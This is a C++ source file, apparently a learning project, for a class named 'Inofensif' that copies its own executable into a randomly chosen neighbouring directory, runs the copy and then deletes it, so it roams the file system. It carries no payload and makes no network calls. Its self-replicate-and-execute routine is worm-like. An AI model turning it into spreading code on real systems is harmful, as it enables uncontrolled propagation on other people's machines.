#include "Inofensif.hpp"
#include "utils.hpp"
#include <fstream>
#include <iostream>
#include <unistd.h>
#include <sys/wait.h>

Movement		Inofensif::choisirMovementAleatoire(void)
{
	return static_cast<Movement>(get_random(0, 2));
}

std::filesystem::path	Inofensif::choisirRepertoireAleatoire(void)
{
	if (vector_path.empty())
		return position;
	return vector_path[get_random(0, vector_path.size() - 1)];
}

void			Inofensif::list_directory_to_vector_path(const std::filesystem::path& where)
{
	for (const auto& entry : std::filesystem::directory_iterator(where))
	{
		if (std::filesystem::is_directory(entry))
		{
			vector_path.push_back(entry.path());
			if (debug)
				std::cout << "directory_element[" << vector_path.size() - 1 << "] = " << vector_path.back() << std::endl;
		}
	}
	if (debug)
		std::cout << "il y a " << vector_path.size() << " répertoires." << std::endl;
}

std::filesystem::path 	Inofensif::get_dir_target(void)
{
	std::filesystem::path	target;
	if (debug)
		announce();
	switch (movement)
	{
		case Movement::Avance:
			if (debug) std::cout << "j'avance" << std::endl;
			list_directory_to_vector_path(position);
			target = choisirRepertoireAleatoire();
			break;
		case Movement::Recule:
			if (debug) std::cout << "je recule" << std::endl;
			target = position.parent_path();
			break;
		default:
			if (debug) std::cout << "je reste ici" << std::endl;
			target = position;
			break;
	}
	return target;
}

void			Inofensif::announce(void)
{
	std::cout << "-----------------------------INO------------------------------\n"
	          << "position actuelle: " << position << std::endl;
}

void			Inofensif::clone_itself(void)
{
	char buffer[4000];
	clone_path = dir_target / "clone";
	std::ofstream clone(clone_path);
	std::ifstream itself("/proc/self/exe", std::ios::binary);

	if (debug)
	{
		std::cout << "clone FILE_OPEN: " << clone.is_open() << std::endl;
		std::cout << "itself FILE_OPEN: " << itself.is_open() << std::endl;
	}

	while (itself.read(buffer, sizeof(buffer)) || itself.gcount())
		clone.write(buffer, itself.gcount());

	std::filesystem::permissions(clone_path,
		std::filesystem::perms::owner_all | std::filesystem::perms::group_all,
		std::filesystem::perm_options::add);

	if (debug)
		std::cout << "clone created" << std::endl;

	itself.close();
	clone.close();
}

void			Inofensif::execute_and_delete_program(void)
{
	std::filesystem::path to_remove = dir_target / "clone";
	if (debug)
	{
		std::cout << "clone path: " << clone_path << std::endl;
		std::cout << "to remove: " << to_remove << std::endl;
	}
	std::cout << "to execute: " << to_remove.filename().c_str() << std::endl;
	const pid_t pid = fork();
	if (pid == 0)
		execl(to_remove.c_str(), "clone", NULL);
	else
		waitpid(pid, NULL, 0);

	std::filesystem::remove(to_remove);
}

Inofensif::Inofensif()
	: position(std::filesystem::current_path()),
	  movement(choisirMovementAleatoire()),
	  dir_target(get_dir_target())
{
	sleep(2);
	if (debug)
		std::cout << "le répertoire cible est:___________" << dir_target << std::endl;
	clone_itself();
	execute_and_delete_program();
}

